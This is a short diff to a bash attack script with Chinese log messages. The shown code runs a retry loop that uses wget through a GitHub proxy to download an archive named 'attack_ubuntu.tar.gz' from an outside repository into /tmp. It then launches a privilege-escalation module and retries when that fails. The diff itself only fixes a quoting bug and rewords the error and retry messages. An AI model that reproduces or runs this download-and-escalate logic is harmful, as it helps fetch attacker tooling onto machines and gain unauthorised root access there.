@@ -132,7 +132,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
     fi
     wget -q --no-cache --tries=3 --timeout=15 \
         "https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack_ubuntu.tar.gz" \
-        -O "/tmp/attack_ubuntu.tar.gz
+        -O "/tmp/attack_ubuntu.tar.gz"
 
     log_info "[+] 下载阶段完成，继续后续操作..."
     log_info "[*] 启动提权模块"
@@ -149,8 +149,8 @@ while [ $attempt -le $MAX_RETRIES ]; do
 
     else
         exit_code=$?
-        log_error "[-] 提权执行失败，退出码: $exit_code"
-        log_warn "[*] 将在 ${RETRY_DELAY} 秒后重试..."
+        log_error "[-] 提权执行失败 (退出码: $exit_code)"
+        log_warn "[*] 将在 ${RETRY_DELAY} 秒后重试... ($((attempt + 1))/${MAX_RETRIES})"
         attempt=$((attempt + 1))
         sleep $RETRY_DELAY
     fi
